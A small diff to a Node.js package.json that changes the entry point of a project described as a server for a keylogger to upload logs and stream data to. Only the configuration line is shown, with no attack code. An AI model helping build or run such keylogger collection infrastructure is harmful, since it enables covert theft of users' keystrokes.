@@ -2,7 +2,7 @@
   "name": "server",
   "version": "0.1.0",
   "description": "Server for the keylogger to upload logs/stream data to",
-  "main": "dist/index.js",
+  "main": "dist/api/index.js",
   "type": "module",
   "scripts": {
     "serve": "node .",
